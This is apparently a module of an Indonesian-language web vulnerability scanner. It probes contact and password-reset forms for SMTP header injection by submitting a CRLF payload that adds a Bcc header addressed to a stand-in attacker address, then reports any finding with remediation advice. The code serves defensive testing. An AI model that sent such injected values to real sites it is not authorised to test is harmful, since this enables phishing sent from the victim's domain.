"""SMTP header injection in contact / share / forgot-password forms.

Auto-validation: kirim payload `\r\n` ke field email; bila response error
khas SMTP / parameter dipantulkan ke link dengan format Bcc:, atau status
500 berkorelasi spesifik vs payload kontrol = vulnerable.
"""
from __future__ import annotations

import re
from urllib.parse import urljoin

from cyberloka.core import Finding, HttpClient, Severity, Target
from cyberloka.core.config import ScanConfig
from cyberloka.recon.crawler import get_state

PAYLOAD_TPL = "victim@example.com%0d%0aBcc: cyblok-attacker@evil.invalid"
DECODED = "Bcc: cyblok-attacker@evil.invalid"
ERROR_RE = re.compile(
    r"(swiftmailer|phpmailer|mail\(\)|smtp.*error|invalid (recipient|address|mailbox)"
    r"|relay access denied|sendmail|mailer error)", re.I,
)


def _email_field(form: dict) -> str | None:
    for inp in form.get("inputs", []):
        name = (inp.get("name") or "").lower()
        type_ = (inp.get("type") or "").lower()
        if type_ == "email" or "email" in name:
            return inp["name"]
    return None


def run(target: Target, config: ScanConfig) -> list[Finding]:
    findings: list[Finding] = []
    state = get_state(config)
    if not state:
        return findings
    candidates = []
    for f in state.forms:
        if _email_field(f):
            # Form yang relevan: hanya yang field-nya sedikit (kontak/lupa pwd)
            inputs = [i for i in f["inputs"] if i.get("type") not in ("submit", "button")]
            if 1 <= len(inputs) <= 6:
                candidates.append(f)
    if not candidates:
        return findings

    client = HttpClient(config)
    try:
        for form in candidates[:5]:
            email_field = _email_field(form)
            if not email_field:
                continue
            base = {
                i["name"]: i.get("value") or "cyblok"
                for i in form["inputs"]
                if i.get("type") not in ("submit", "button")
            }
            method = (form.get("method") or "post").lower()
            action = urljoin(target.base_url, form.get("action") or "")

            # Baseline polos
            normal = {**base, email_field: "victim@example.com"}
            r0 = (client.post(action, data=normal) if method == "post"
                  else client.get(action, params=normal))
            if r0 is None:
                continue
            base_status = r0.status_code
            base_len = len(r0.text or "")

            # Payload injeksi
            poison = {**base, email_field: PAYLOAD_TPL}
            r = (client.post(action, data=poison) if method == "post"
                 else client.get(action, params=poison))
            if r is None:
                continue
            body = r.text or ""

            confirmed = False
            note = ""
            # 1. Server error khas SMTP -> indikasi mail() dipanggil dengan input nakal
            if r.status_code >= 500 and base_status < 500 and ERROR_RE.search(body):
                confirmed = True
                note = "Server error 5xx + signature mailer di response"
            # 2. Body memantulkan string Bcc utuh
            elif DECODED in body or "Bcc:" in body and "cyblok-attacker" in body:
                confirmed = True
                note = "Header Bcc dipantulkan ke response"
            # 3. Beda response signifikan + parameter ter-decode
            elif (abs(len(body) - base_len) > 200
                  and ("cyblok-attacker" in body or "Bcc%3A" in body)):
                confirmed = True
                note = "Beda response + payload ter-decode"

            if confirmed:
                findings.append(Finding(
                    module="smtp_header_injection",
                    title=f"SMTP header injection di field `{email_field}`",
                    severity=Severity.HIGH,
                    description=(
                        "Form mengizinkan karakter newline (\\r\\n) di field "
                        "email, memungkinkan attacker menyisipkan header SMTP "
                        "tambahan (Bcc, From, dll). Phishing dari domain "
                        "resmi target = SPF/DKIM lulus."
                    ),
                    target=action,
                    urls=[action],
                    evidence=f"payload={PAYLOAD_TPL}; status={base_status}->{r.status_code}; {note}",
                    cwe="CWE-93",
                    confidence="confirmed",
                    remediation=(
                        "Validasi field email dengan regex strict (RFC 5321) "
                        "dan tolak `\\r` / `\\n`. Pakai library mailer "
                        "(PHPMailer 6+, Symfony Mailer) yang melakukan "
                        "encoding header otomatis. Jangan inline `mail($to, "
                        "$subj, $body, \"From: $userInput\")`."
                    ),
                    references=[
                        "https://owasp.org/www-community/vulnerabilities/CRLF_Injection",
                    ],
                ))
                break
    finally:
        client.close()
    return findings
